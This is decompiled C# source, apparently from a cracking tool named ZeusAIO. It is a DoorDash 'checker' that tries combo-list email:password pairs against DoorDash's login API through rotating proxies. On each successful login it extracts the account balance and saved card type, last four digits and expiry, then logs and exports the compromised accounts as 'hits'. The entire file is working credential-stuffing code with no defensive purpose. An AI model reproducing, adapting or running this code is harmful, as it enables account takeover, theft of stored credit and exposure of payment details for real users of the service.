// Decompiled with JetBrains decompiler
// Type: Doordash.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Doordash
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "email=" + s[0] + "&password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://api.doordash.com/v2/auth/web_login/", str1, "application/x-www-form-urlencoded").ToString();
              if (!str2.Contains("Incorrect username or password"))
              {
                if (str2.Contains("last_name"))
                {
                  if (str2.Contains("account_credits\":0"))
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - DOORDASH] " + s[0] + ":" + s[1] + " | Balance: 0.00", Color.OrangeRed);
                    Export.AsResult("/Doordash_frees", s[0] + ":" + s[1] + " | Balance: 0.00");
                    return false;
                  }
                  double num = double.Parse(Regex.Match(str2, "account_credits\":(.*?),").Groups[1].Value);
                  string str3 = Check.Parse(str2, "\",\"type\":\"", "\",");
                  string str4 = Check.Parse(str2, "exp_year\":\"", "\",");
                  string str5 = Check.Parse(str2, "exp_month\":\"", "\",");
                  string str6 = Check.Parse(str2, "last4\":\"", "\",");
                  string str7 = " | Balance: $" + (num / 100.0).ToString() + " | CC: " + str3 + "|" + str6 + "|" + str5 + "/" + str4;
                  Check.Parse(str2, "\"account_credits\":", ",");
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - DOORDASH] " + s[0] + ":" + s[1] + str7, Color.Green);
                  Export.AsResult("/Doordash_hits", s[0] + ":" + s[1] + str7);
                  return false;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
